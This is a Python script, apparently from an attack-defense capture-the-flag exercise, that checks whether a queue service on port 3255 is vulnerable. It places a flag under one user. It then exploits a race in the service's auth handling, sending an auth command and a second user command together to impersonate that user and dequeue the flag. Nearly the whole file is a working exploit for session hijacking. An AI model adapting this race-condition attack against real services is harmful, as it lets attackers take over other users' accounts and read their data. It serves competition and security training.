#!/usr/bin/env python

import sys
import requests
import random
import socket


PORT = 3255

# Error codes
OK = 101
CORRUPT = 102
MUMBLE = 103
DOWN = 104
ERROR = 110


# Helpers
def gen_random_str(str_len, abc=list("abcdefgijklmnopqrstuvwxyz1234567890")):
    ret = []
    for i in range(str_len):
        ret.append(random.choice(abc))
    return "".join(ret)


def readline(s):
    chars = []
    while True:
        a = s.recv(1)
        chars.append(a)
        if a == "\n" or a == "":
            return "".join(chars)


def send_and_check_for_output(s, line, substr, stage, fail_exit_code=MUMBLE):
    s.send(line)
    ans = readline(s)
    if substr not in ans:
        print('{}: bad output'.format(stage))
        sys.exit(fail_exit_code)


def register_or_die(host, login, password):
    ans = requests.post("http://{0}/register".format(host),
                        data={"login": login, "first_name": login,
                              "last_name": "", "password": password,
                              "language": "en"})
    if ans.status_code == 500:
        print("Failed to register the user in the user service: %s" % login)
        sys.exit(DOWN)


def get_session_num_or_die(host, login, password):
    ans = requests.post("http://{0}/login".format(host),
                        data={"login": login, "password": password})

    if "session" not in ans.cookies:
        print("Failed to login to the user service")
        sys.exit(DOWN)

    return ans.cookies["session"]


def place_a_flag(host, user, password, queuename, flag):
    session = get_session_num_or_die(host, user, password)
    try:
        s = socket.create_connection((host, PORT), 10)
    except Exception as E:
        print('Connect: {}'.format(E))
        sys.exit(DOWN)

    readline(s)

    send_and_check_for_output(s, b"user {}\n".format(user),
                              "OK", "USER cmd")
    send_and_check_for_output(s, b"auth {}\n".format(session),
                              "OK", "AUTH cmd")

    send_and_check_for_output(s, b"create {}\n".format(queuename),
                              "OK", "CREATE cmd")

    send_and_check_for_output(s, b"enqueue {} {}\n".format(queuename, flag),
                              "OK", "ENQUEUE cmd")


def try_to_get_a_flag(host, user, queuename, flag):
    evil_user = gen_random_str(10)
    evil_password = gen_random_str(10)

    register_or_die(host, evil_user, evil_password)
    session = get_session_num_or_die(host, evil_user, evil_password)

    try:
        s = socket.create_connection((host, PORT), 10)
    except Exception as E:
        print('Connect: {}'.format(E))
        sys.exit(DOWN)
    readline(s)

    # Try to exploit race in auth
    for i in range(10):
        s.send(b"user {}\n".format(evil_user))
        ans = readline(s)
        if not "OK" in ans:
            print("USER cmd: bad output")
            sys.exit(MUMBLE)

        s.send(b"auth {}\nuser {}\n".format(session, user))
        ans1 = readline(s)
        ans2 = readline(s)
        if "OK" in ans1 and "OK" in ans2:
            break
    else:
        print("ERR: Host is not vulnerable(or race didn't occur)")
        sys.exit(CORRUPT)
    send_and_check_for_output(s, b"dequeue {}\n".format(queuename),
                              flag, "Failed to get a flag or wrong flag")


def check(host):
    user = gen_random_str(10)
    password = gen_random_str(10)
    queuename = gen_random_str(10)
    flag = gen_random_str(10)

    register_or_die(host, user, password)

    place_a_flag(host, user, password, queuename, flag)
    try_to_get_a_flag(host, user, queuename, flag)

    print("OK: host is vulnerable")
    sys.exit(OK)


if __name__ == "__main__":
    try:
        if len(sys.argv) < 2:
            raise(Exception("Usage: race_in_auth.py <host>"))
        check(sys.argv[1])
    except Exception as E:
        sys.stderr.write("{}\n".format(E))
        sys.exit(ERROR)
